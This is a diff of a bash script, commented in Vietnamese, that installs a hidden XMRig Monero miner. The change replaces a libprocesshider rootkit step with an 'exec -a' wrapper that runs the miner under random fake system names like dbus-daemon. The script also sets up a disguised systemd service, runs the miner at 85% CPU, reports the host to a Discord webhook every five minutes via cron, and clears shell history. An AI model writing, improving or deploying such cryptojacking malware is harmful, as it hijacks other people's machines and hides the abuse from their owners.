@@ -11,13 +11,13 @@ TOTAL_CORES=$(nproc)
 CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.85)}")
 PRIORITY=0
 
-CUSTOM_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
+FAKE_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
 INSTALL_DIR="$HOME/.local/share/.system"
 SERVICE_NAME=$(shuf -n1 -e "sysdaemon" "core-logger" "netwatchd" "usb-handler")
 LOG_FILE="/tmp/.core-log.txt"
 # ============================
 
-echo "🛠️ Đang cài đặt XMRig stealth + tối ưu hiệu suất..."
+echo "🛠️ Đang cài đặt XMRig stealth (không dùng processhider)..."
 
 # Cài gói cần thiết
 sudo apt update
@@ -36,32 +36,29 @@ mkdir build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make -j$TOTAL_CORES
 
-# Cài libprocesshider để ẩn tiến trình
-cd ~
-rm -rf libprocesshider
-git clone https://github.com/kernelcoder/libprocesshider.git
-cd libprocesshider
-make
-sudo make install
-
 # Tạo thư mục ẩn & copy file
 mkdir -p "$INSTALL_DIR"
-cp ~/xmrig/build/xmrig "$INSTALL_DIR/$CUSTOM_NAME"
-chmod +x "$INSTALL_DIR/$CUSTOM_NAME"
+cp ~/xmrig/build/xmrig "$INSTALL_DIR/xmrig"
+chmod +x "$INSTALL_DIR/xmrig"
 
-# Ẩn process khỏi ps/top
-sudo bash -c "echo $CUSTOM_NAME >> /usr/local/lib/.ph"
+# Tạo script runner dùng exec -a để ngụy trang tiến trình
+tee "$INSTALL_DIR/$FAKE_NAME" > /dev/null << EOF
+#!/bin/bash
+exec -a $FAKE_NAME "$INSTALL_DIR/xmrig" -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
+  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
+  --max-cpu-usage=85 --log-file=$LOG_FILE
+EOF
 
-# Tạo systemd service ngụy trang
+chmod +x "$INSTALL_DIR/$FAKE_NAME"
+
+# Tạo systemd service
 sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
 [Unit]
-Description=System Cleanup Daemon
+Description=System Monitor Daemon
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
-  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
-  --max-cpu-usage=85 --log-file=$LOG_FILE
+ExecStart=$INSTALL_DIR/$FAKE_NAME
 Restart=always
 Nice=0
 
@@ -78,7 +75,7 @@ sudo systemctl start $SERVICE_NAME
 tee "$INSTALL_DIR/logger.sh" > /dev/null << EOF
 #!/bin/bash
 WEBHOOK="$DISCORD_WEBHOOK"
-PROCESS_NAME="$CUSTOM_NAME"
+PROCESS_NAME="$FAKE_NAME"
 HOST="\$(hostname)"
 HASHRATE="Unknown"
 LOG_FILE="$LOG_FILE"
@@ -93,7 +90,7 @@ THREADS=\$(nproc)
 
 curl -s -H "Content-Type: application/json" -X POST -d "{
   \\"username\\": \\"XMRig Stealth\\",
-  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đang đào XMR\\n🔧 Process: \\\`$CUSTOM_NAME\\\`\\n🧵 Threads: \\\`\$THREADS\\\`\\n⚡ Hashrate: \\\`\$HASHRATE\\\`\\n💻 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n🕒 Uptime: \\\`\$UPTIME\\\`\\"
+  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đang đào XMR\\n🔧 Process: \\\`$FAKE_NAME\\\`\\n🧵 Threads: \\\`\$THREADS\\\`\\n⚡ Hashrate: \\\`\$HASHRATE\\\`\\n💻 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n🕒 Uptime: \\\`\$UPTIME\\\`\\"
 }" "\$WEBHOOK" > /dev/null 2>&1
 EOF
 
@@ -102,15 +99,13 @@ chmod +x "$INSTALL_DIR/logger.sh"
 # Cron gửi log mỗi 5 phút
 (crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logger.sh") | crontab -
 
-# Gửi ping đầu tiên
+# Gửi log lần đầu
 "$INSTALL_DIR/logger.sh"
 
 # Xoá dấu vết
 cd ~
-rm -rf xmrig libprocesshider
+rm -rf xmrig
 history -c
 
 echo ""
-echo "✅ Đã khởi động XMRig stealth mode! Log sẽ gửi về Discord mỗi 5 phút. 🚀"
-
-# Không chạy htop để tránh lộ
+echo "✅ Đã cài đặt XMRig stealth không cần processhider! Log gửi về Discord mỗi 5 phút 🚀"
